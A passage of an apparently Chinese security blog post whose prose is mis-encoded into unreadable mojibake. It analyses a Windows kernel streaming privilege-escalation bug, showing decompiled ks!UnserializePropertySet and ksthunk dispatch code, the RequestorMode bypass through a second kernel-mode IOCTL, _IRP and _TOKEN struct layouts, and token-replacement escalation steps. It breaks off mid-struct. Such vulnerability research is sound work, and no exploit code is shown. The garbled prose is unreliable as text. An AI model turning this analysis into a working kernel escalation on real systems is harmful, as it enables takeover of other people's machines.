<code>KSPROPERTY_TYPE_SERIALIZESET</code> å’Œ <code>KSPROPERTY_TYPE_UNSERIALIZESET</code> åŠŸèƒ½å…è®¸ç”¨æˆ·é€šè¿‡ <strong>å•æ¬¡è°ƒç”¨</strong> ä¸å¤šä¸ª Property è¿›è¡Œæ“ä½œã€‚</p><p>å½“æˆ‘ä»¬ç”¨è¿™åŠŸèƒ½æ—¶ï¼Œè¿™äº› requests å°†è¢« <em>KsPropertyHandler</em> å‡½æ•°åˆ†è§£æˆå¤šä¸ªå‘¼å«</p><blockquote><p><em>KSPROPERTY_TYPE_SERIALIZESET</em> å’Œ <em>KSPROPERTY_TYPE_UNSERIALIZESET</em> è¯·æ±‚å…è®¸é€šè¿‡å®¢æˆ·ç«¯çš„ä¸€æ¬¡è°ƒç”¨ä¸å¤šä¸ªå±æ€§è¿›è¡Œäº¤äº’ã€‚å¦‚æœå†…æ ¸æµå¼å¤„ç†ç¨‹åºç”¨äºå¤„ç†å±æ€§è¯·æ±‚ï¼Œåˆ™è¿™äº›è¯·æ±‚å°†ç”± <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/ks/nf-ks-kspropertyhandler"><strong>KsPropertyHandler</strong></a> å‡½æ•°åˆ†è§£ä¸ºå¤šä¸ªè°ƒç”¨ã€‚ä½¿ç”¨æ­¤å¤„ç†ç¨‹åºæ—¶ï¼Œå±æ€§é›†å®šä¹‰æ§åˆ¶è¦åºåˆ—åŒ–å“ªäº›å±æ€§ã€‚</p></blockquote><p>æ ¹æ®æ–‡ç« ï¼Œæˆ‘ä»¬å¯ä»¥å®šä½åˆ°<em>ks!KsPropertyHandler</em> -&gt;<em>ks!UnserializePropertySet</em>çš„æ¼æ´è°ƒç”¨é“¾ï¼Œè®©æˆ‘ä»¬åˆ†æä¸€ä¸‹</p><h3 id="ks-UnserializePropertySet"><a href="#ks-UnserializePropertySet" class="headerlink" title="ks!UnserializePropertySet"></a>ks!UnserializePropertySet</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">   .........;</span><br><span class="line">v5 = *(_QWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">v6 = *(_QWORD *)(a1 + <span class="number">184</span>);</span><br><span class="line">.........;</span><br><span class="line">v10 = (<span class="type">char</span> *)(v5 + <span class="number">20</span>);</span><br><span class="line">.........;</span><br><span class="line">   OutBuffer = v10 + <span class="number">32</span>;</span><br><span class="line">.........;</span><br><span class="line"><span class="built_in">memmove</span>(PoolWithTag, *(<span class="type">const</span> <span class="type">void</span> **)(v6 + <span class="number">0x20</span>), InSize); <span class="comment">//[1]</span></span><br><span class="line">   PoolWithTag[<span class="number">5</span>] = <span class="number">2</span>;</span><br><span class="line">   v9 = *(_DWORD *)(v5 + <span class="number">16</span>);</span><br><span class="line">   v10 = (<span class="type">char</span> *)(v5 + <span class="number">20</span>);</span><br><span class="line">   v11 = v7 - <span class="number">20</span>;</span><br><span class="line">   v12 = BytesReturned;</span><br><span class="line">   <span class="keyword">while</span> ( v11 &amp;&amp; v9 )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( v11 &lt; <span class="number">0x20</span> )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">     v13 = v10;</span><br><span class="line">     <span class="keyword">if</span> ( *((_DWORD *)v10 + <span class="number">5</span>) )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">     PoolWithTag[<span class="number">4</span>] = *((_DWORD *)v10 + <span class="number">6</span>);</span><br><span class="line">     v14 = v11 - <span class="number">32</span>;</span><br><span class="line">     OutBuffer = v10 + <span class="number">32</span>;</span><br><span class="line">     OutSize = *((_DWORD *)v13 + <span class="number">7</span>);</span><br><span class="line">     <span class="keyword">if</span> ( OutSize &gt; v14 )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">     v17 = <span class="built_in">KsSynchronousIoControlDevice</span>(</span><br><span class="line">             *(PFILE_OBJECT *)(v12 + <span class="number">48</span>),</span><br><span class="line">             <span class="number">0</span>,</span><br><span class="line">             *(_DWORD *)(v12 + <span class="number">24</span>),</span><br><span class="line">             PoolWithTag,</span><br><span class="line">             InSize,</span><br><span class="line">             OutBuffer, <span class="comment">//[2]</span></span><br><span class="line">             OutSize,</span><br><span class="line">             (PULONG)&amp;BytesReturned);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>*(const void **)(v6 + 0x20)</code>[1]å’Œ<code>OutBuffer</code>[2]éƒ½æ˜¯ä»å‚æ•°a1è¿›è¡Œåç§»å¾—åˆ°çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">UnserializePropertySet</span>((__int64)Irp, v21, v7);</span><br></pre></td></tr></table></figure><p>è€Œè°ƒç”¨çš„æ—¶å€™çš„å‚æ•°a1æ˜¯<code>Irp</code></p><p>Irpçš„ç¬¦å·æ˜¯<code>_IRP</code>ï¼Œæ‰¾åˆ°å¯¹åº”çš„ç»“æ„ä½“ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0xd0 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IRP</span></span><br><span class="line">&#123;</span><br><span class="line">    SHORT Type;                                                             <span class="comment">//0x0</span></span><br><span class="line">    USHORT Size;                                                            <span class="comment">//0x2</span></span><br><span class="line">    USHORT AllocationProcessorNumber;                                       <span class="comment">//0x4</span></span><br><span class="line">    USHORT Reserved;                                                        <span class="comment">//0x6</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_MDL</span>* MdlAddress;                                                <span class="comment">//0x8</span></span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0x10</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">_IRP</span>* MasterIrp;                                             <span class="comment">//0x18</span></span><br><span class="line">        LONG IrpCount;                                                      <span class="comment">//0x18</span></span><br><span class="line">        VOID* SystemBuffer;                                                 <span class="comment">//0x18</span></span><br><span class="line">    &#125; AssociatedIrp;                                                        <span class="comment">//0x18</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> ThreadListEntry;                                     <span class="comment">//0x20</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_STATUS_BLOCK</span> IoStatus;                                       <span class="comment">//0x30</span></span><br><span class="line">    CHAR RequestorMode;                                                     <span class="comment">//0x40</span></span><br><span class="line">    UCHAR PendingReturned;                                                  <span class="comment">//0x41</span></span><br><span class="line">    CHAR StackCount;                                                        <span class="comment">//0x42</span></span><br><span class="line">    CHAR CurrentLocation;                                                   <span class="comment">//0x43</span></span><br><span class="line">    UCHAR Cancel;                                                           <span class="comment">//0x44</span></span><br><span class="line">    UCHAR CancelIrql;                                                       <span class="comment">//0x45</span></span><br><span class="line">    CHAR ApcEnvironment;                                                    <span class="comment">//0x46</span></span><br><span class="line">    UCHAR AllocationFlags;                                                  <span class="comment">//0x47</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_STATUS_BLOCK</span>* UserIosb;                                      <span class="comment">//0x48</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_KEVENT</span>* UserEvent;                                              <span class="comment">//0x50</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">union</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">VOID</span> (*UserApcRoutine)(VOID* arg1, <span class="keyword">struct</span> _IO_STATUS_BLOCK* arg2, ULONG arg3); <span class="comment">//0x58</span></span><br><span class="line">                VOID* IssuingProcess;                                       <span class="comment">//0x58</span></span><br><span class="line">            &#125;;</span><br><span class="line">            VOID* UserApcContext;                                           <span class="comment">//0x60</span></span><br><span class="line">        &#125; AsynchronousParameters;                                           <span class="comment">//0x58</span></span><br><span class="line">        <span class="keyword">union</span> <span class="title class_">_LARGE_INTEGER</span> AllocationSize;                                <span class="comment">//0x58</span></span><br><span class="line">    &#125; Overlay;                                                              <span class="comment">//0x58</span></span><br><span class="line">    <span class="built_in">VOID</span> (*CancelRoutine)(<span class="keyword">struct</span> _DEVICE_OBJECT* arg1, <span class="keyword">struct</span> _IRP* arg2);  <span class="comment">//0x68</span></span><br><span class="line">    VOID* UserBuffer;                                                       <span class="comment">//0x70</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">union</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">struct</span> <span class="title class_">_KDEVICE_QUEUE_ENTRY</span> DeviceQueueEntry;               <span class="comment">//0x78</span></span><br><span class="line">                VOID* DriverContext[<span class="number">4</span>];                                     <span class="comment">//0x78</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">struct</span> <span class="title class_">_ETHREAD</span>* Thread;                                        <span class="comment">//0x98</span></span><br><span class="line">            CHAR* AuxiliaryBuffer;                                          <span class="comment">//0xa0</span></span><br><span class="line">            <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> ListEntry;                                   <span class="comment">//0xa8</span></span><br><span class="line">            <span class="keyword">union</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">struct</span> <span class="title class_">_IO_STACK_LOCATION</span>* CurrentStackLocation;            <span class="comment">//0xb8</span></span><br><span class="line">                ULONG PacketType;                                           <span class="comment">//0xb8</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">struct</span> <span class="title class_">_FILE_OBJECT</span>* OriginalFileObject;                        <span class="comment">//0xc0</span></span><br><span class="line">            VOID* IrpExtension;                                             <span class="comment">//0xc8</span></span><br><span class="line">        &#125; Overlay;                                                          <span class="comment">//0x78</span></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">_KAPC</span> Apc;                                                   <span class="comment">//0x78</span></span><br><span class="line">        VOID* CompletionKey;                                                <span class="comment">//0x78</span></span><br><span class="line">    &#125; Tail;                                                                 <span class="comment">//0x78</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p><code>v6 = *(_QWORD *)(Irp + 0xB8);</code>å¯¹åº”<code>_IRP-&gt;CurrentStackLocation</code></p><p>è€Œ<code>*(const void **)(v6 + 0x20)</code>å¯¹åº”<code>_IRP-&gt;CurrentStackLocation-&gt;DeviceIoControl-&gt;Type3InputBuffer</code>ï¼Œè¿™ä¸ªå‚æ•°æ˜¯ç”¨æˆ·å¯æ§çš„</p><blockquote><p>ä½†æ˜¯å…¶å®å¯¹åº”åˆ°0x20çš„è¿˜æœ‰å‡ ä¸ªæˆå‘˜ï¼Œä¼°è®¡å¾—ä¹‹ååˆ†ææ‰èƒ½è§£å†³ä¸ºä»€ä¹ˆæ˜¯å¯¹åº”è¿™ä¸ªçš„é—®é¢˜äº†ï¼Œæˆ‘è®¤ä¸ºæ˜¯å› ä¸ºæœ¬èº«è¿™ä¸ªå‡½æ•°æ“çºµçš„å°±æ˜¯deviceç›¸å…³çš„ï¼Œå› æ­¤å¯ä»¥è®¤å®šå°±æ˜¯æœ‰å…³ <em>DeviceIoControl</em> çš„æˆå‘˜</p></blockquote><p>è€Œç»è¿‡æˆ‘çš„åˆ†æ<code>OutBuffer</code>å°±æ˜¯<code>_IO_STATUS_BLOCK-&gt;Pointer</code>ï¼Œä¹Ÿæ˜¯æ¥è‡ªäºç”¨æˆ·çš„Irpè¯·æ±‚ï¼Œç°åœ¨å°±è¦çœ‹ç”¨æˆ·èƒ½æ§åˆ¶Irpè¯·æ±‚åˆ°ä»€ä¹ˆleveläº†</p><p>è€Œè°ƒç”¨ <em>UnserializePropertySet</em> æ—¶çš„æµç¨‹ï¼Œå¤§æ¦‚å¦‚ä¸‹å›¾æ‰€ç¤º ï¼š</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116865.png" alt="image-20250904141946368" style="zoom:50%;" /><p>ç¬¬ä¸€æ¬¡ IOCTL æ—¶å¯ä»¥çœ‹åˆ°å›¾ä¸­ç¬¬ 2 æ­¥ I&#x2F;O Manager ä¼šå°† <code>Irp-&gt;RequestorMode</code> è®¾æˆ UserModeï¼ˆ1ï¼‰ï¼Œç›´åˆ°ç¬¬ 6 æ­¥æ—¶ï¼Œks ä¼šå»åˆ¤æ–­ç”¨æˆ· <em>requests</em> çš„ <em>Property</em> æ˜¯å¦å­˜åœ¨äºè¯¥ KS Object ä¸­ï¼Œå¦‚æœè¯¥ KS Object çš„ <em>Property</em> <strong>å­˜åœ¨</strong> ï¼Œå¹¶ä¸” <code>KSPROPERTY_TYPE_UNSERIALIZESET</code> å°±ä¼šç”¨ <code>UnserializePropertySet</code> æ¥å¤„ç†æŒ‡å®šçš„ <em>Property</em></p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116866.png" alt="image-20250904142120404" style="zoom:50%;" /><p>è€Œæ¥ä¸‹æ¥ç¬¬ 7 æ­¥å°±ä¼šå‘¼å« <em>KsSynchronousIoControlDevice</em> é‡æ–°åšä¸€æ¬¡ IOCTLï¼Œè€Œæ­¤æ—¶æ–°çš„ <code>Irp-&gt;RequestorMode</code> å°±å˜æˆäº† KernelModeï¼ˆ0ï¼‰ äº†ï¼Œè€Œåç»­çš„å¤„ç†å°±å¦‚ä¸€èˆ¬çš„ <em>IOCTL_KS_PROPERTY</em> ç›¸åŒ</p><p>æ¥ä¸‹æ¥å°±çœ‹æ€ä¹ˆè°ƒç”¨åˆ°<code>UnserializePropertySet</code>äº†</p><h3 id="ksthunk-CKSThunkDevice-DispatchIoctl"><a href="#ksthunk-CKSThunkDevice-DispatchIoctl" class="headerlink" title="ksthunk!CKSThunkDevice::DispatchIoctl"></a>ksthunk!CKSThunkDevice::DispatchIoctl</h3><p>æœ€å…ˆçœ‹åˆ°çš„æƒ³å¿…å°±æ˜¯å…¥å£ç‚¹ ksthunk</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CKSThunkDevice::DispatchIoctl</span><span class="params">(CKernelFilterDevice *a1, IRP *a2, <span class="type">unsigned</span> <span class="type">int</span> a3, <span class="type">int</span> *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_STACK_LOCATION</span> *CurrentStackLocation; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">CKernelFilterFile</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// r8</span></span><br><span class="line">  __int64 v12; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  CurrentStackLocation = a2-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  v9 = CKernelFilterDevice::<span class="built_in">FileObjectToFilterFile</span>(a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    <span class="keyword">return</span> (*(__int64 (__fastcall **)(<span class="keyword">struct</span> CKernelFilterFile *, IRP *, _QWORD, <span class="type">int</span> *))(*(_QWORD *)v9 + <span class="number">40LL</span>))(</span><br><span class="line">             v9,</span><br><span class="line">             a2,</span><br><span class="line">             a3,</span><br><span class="line">             a4);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">IoIs32bitProcess</span>(a2) &amp;&amp; a2-&gt;RequestorMode )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( CurrentStackLocation-&gt;Parameters.Read.ByteOffset.LowPart == <span class="number">3080195</span> )</span><br><span class="line">      <span class="keyword">return</span> CKSAutomationThunk::<span class="built_in">ThunkPropertyIrp</span>((<span class="type">char</span> *)a1 + <span class="number">64</span>, a2, v11, a4);</span><br><span class="line">    v12 = CurrentStackLocation-&gt;Parameters.Read.ByteOffset.LowPart - <span class="number">3080199</span>;</span><br><span class="line">    <span class="keyword">if</span> ( CurrentStackLocation-&gt;Parameters.Read.ByteOffset.LowPart == <span class="number">3080199</span> )</span><br><span class="line">      <span class="keyword">return</span> CKSAutomationThunk::<span class="built_in">ThunkEnableEventIrp</span>(v12, a2, v11, a4);</span><br><span class="line">    <span class="keyword">if</span> ( CurrentStackLocation-&gt;Parameters.Read.ByteOffset.LowPart == <span class="number">3080203</span> )</span><br><span class="line">      <span class="keyword">return</span> CKSAutomationThunk::<span class="built_in">ThunkDisableEventIrp</span>(v12, a2, v11, a4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( CurrentStackLocation-&gt;Parameters.Read.ByteOffset.LowPart == <span class="number">0x2F0003</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> CKSThunkDevice::<span class="built_in">CheckIrpForStackAdjustmentNative</span>((__int64)a1, a2, v11, a4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯64ä½çš„è¯·æ±‚ï¼Œä¼šæ‰§è¡Œ<code>CKSThunkDevice::CheckIrpForStackAdjustmentNative</code>å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116867.png" alt="image-20250904183404906"></p><p>è€Œåœ¨è¯¥å‡½æ•°ä¸­å­˜åœ¨ä¸€ä¸ªå¯¹RequestorModeçš„æ£€æŸ¥ï¼Œå¦‚æœæ˜¯UserModeè®¿é—®ï¼Œä¼šç›´æ¥è¿”å›ä¸€ä¸ªErrorä»£ç ï¼Œä½†æ˜¯å› ä¸ºä¸Šè¿°åˆ†æçš„ç¬¬äºŒæ¬¡IOCTLçš„å¤„ç†æ˜¯KernelModeçš„ï¼Œä¼šç›´æ¥å°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä½œä¸ºå‡½æ•°å¤„ç†ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯æ§çš„</p><h2 id="å¸¸è§çš„EoPæ–¹æ³•"><a href="#å¸¸è§çš„EoPæ–¹æ³•" class="headerlink" title="å¸¸è§çš„EoPæ–¹æ³•"></a>å¸¸è§çš„EoPæ–¹æ³•</h2><h3 id="æ›¿æ¢token"><a href="#æ›¿æ¢token" class="headerlink" title="æ›¿æ¢token"></a>æ›¿æ¢token</h3><p><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation#id-1.-replacing-tokens-for-privilege-escalation">ç”¨System token å–ä»£å½“å‰çš„Process token</a></p><ul><li>ç³»ç»Ÿä¸Šè¿è¡Œçš„æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰å…¶ç›¸åº”çš„ <code>_EPROCESS</code> å†…æ ¸ç»“æ„</li><li><code>_EPROCESS</code> ç»“æ„åŒ…å«æŒ‡å‘æè¿°è¿›ç¨‹å®‰å…¨ä¸Šä¸‹æ–‡çš„ <code>_TOKEN</code> å†…å­˜ç»“æ„çš„æŒ‡é’ˆ</li><li>å†…æ ¸æ¼æ´åˆ©ç”¨æ‰¾åˆ°ä½ç‰¹æƒè¿›ç¨‹çš„ <code>_TOKEN</code> ç»“æ„çš„åœ°å€ - å®ƒæƒ³è¦ä»ä¸­å‡çº§çš„è¿›ç¨‹</li><li>å†…æ ¸æ¼æ´åˆ©ç”¨æŸ¥æ‰¾ç‰¹æƒè¿›ç¨‹çš„ <code>_TOKEN</code> ç»“æ„çš„åœ°å€ï¼Œä»¥ <code>NT\SYSTEM</code> å½¢å¼è¿è¡Œ</li><li>å†…æ ¸æ¼æ´åˆ©ç”¨å°†ä½ç‰¹æƒè¿›ç¨‹çš„ä»¤ç‰Œæ›¿æ¢ä¸ºé«˜ç‰¹æƒä»¤ç‰Œ</li></ul><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116868.png" alt="image-20250904215419279" style="zoom:50%;" /><blockquote><p>åœ¨win11ä¸­ï¼Œ<code>_EX_FAST_REF</code>æ˜¯Tokençš„ç»“æ„ä½“ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_EX_FAST_REF</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">union</span></span><br><span class="line"> &#123;</span><br><span class="line">     VOID* Object;                                                       <span class="comment">//0x0</span></span><br><span class="line">     ULONGLONG RefCnt:<span class="number">4</span>;                                                 <span class="comment">//0x0</span></span><br><span class="line">     ULONGLONG Value;                                                    <span class="comment">//0x0</span></span><br><span class="line"> &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>è¿™é‡ŒRefCntæ˜¯å¼•ç”¨è®¡æ•°ï¼Œå æœ€åå››ä¸ªbitï¼Œä¾‹å¦‚0x7FFF FFFFï¼Œåˆ™çœŸæ­£çš„tokenæ˜¯0x7FFF FFF0ï¼Œç„¶å0xFæ˜¯å¼•ç”¨çš„æ¬¡æ•°</p></blockquote><h3 id="ä¿®æ”¹tokenæƒé™"><a href="#ä¿®æ”¹tokenæƒé™" class="headerlink" title="ä¿®æ”¹tokenæƒé™"></a>ä¿®æ”¹tokenæƒé™</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x498 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_TOKEN</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_TOKEN_SOURCE</span> TokenSource;                                       <span class="comment">//0x0</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LUID</span> TokenId;                                                   <span class="comment">//0x10</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LUID</span> AuthenticationId;                                          <span class="comment">//0x18</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LUID</span> ParentTokenId;                                             <span class="comment">//0x20</span></span><br><span class="line">    <span class="keyword">union</span> <span class="title class_">_LARGE_INTEGER</span> ExpirationTime;                                    <span class="comment">//0x28</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_ERESOURCE</span>* TokenLock;                                           <span class="comment">//0x30</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LUID</span> ModifiedId;                                                <span class="comment">//0x38</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_TOKEN_PRIVILEGES</span> Privileges;                                <span class="comment">//0x40</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_AUDIT_POLICY</span> AuditPolicy;                                   <span class="comment">//0x58</span></span><br><span class="line">    ULONG SessionId;                                                        <span class="comment">//0x78</span></span><br><span class="line">    ULONG UserAndGroupCount;                                                <span class="comment">//0x7c</span></span><br><span class="line">    ULONG RestrictedSidCount;                                               <span class="comment">//0x80</span></span><br><span class="line">    ULONG VariableLength;                                                   <span class="comment">//0x84</span></span><br><span class="line">    ULONG DynamicCharged;                                                   <span class="comment">//0x88</span></span><br><span class="line">    ULONG DynamicAvailable;                                                 <span class="comment">//0x8c</span></span><br><span class="line">    ULONG DefaultOwnerIndex;                                                <span class="comment">//0x90</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SID_AND_ATTRIBUTES</span>* UserAndGroups;                              <span class="comment">//0x98</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SID_AND_ATTRIBUTES</span>* RestrictedSids;                             <span class="comment">//0xa0</span></span><br><span class="line">    VOID* PrimaryGroup;                                                     <span class="comment">//0xa8</span></span><br><span class="line">    ULONG* DynamicPart;                                                     <span class="comment">//0xb0</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_ACL</span>* DefaultDacl;                                               <span class="comment">//0xb8</span></span><br><span class="line">    <span class="keyword">enum</span> <span class="title class_">_TOKEN_TYPE</span> TokenType;                                             <span class="comment">//0xc0</span></span><br><span class="line">    <span class="keyword">enum</span> <span class="title class_">_SECURITY_IMPERSONATION_LEVEL</span> ImpersonationLevel;                  <span class="comment">//0xc4</span></span><br><span class="line">    ULONG TokenFlags;                                                       <span class="comment">//0xc8</span></span><br><span class="line">    UCHAR TokenInUse;                                                       <span class="comment">//0xcc</span></span><br><span class="line">    ULONG IntegrityLevelIndex;                                              <span class="comment">//0xd0</span></span><br><span class="line">    ULONG MandatoryPolicy;                                                  <span class="comment">//0xd4</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_LOGON_SESSION_REFERENCES</span>* LogonSession;                     <span class="comment">//0xd8</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LUID</span> OriginatingLogonSession;                                   <span class="comment">//0xe0</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SID_AND_ATTRIBUTES_HASH</span> SidHash;                                <span class="comment">//0xe8</span></span><br><span class="line">    <span class="keyword">struct</span> 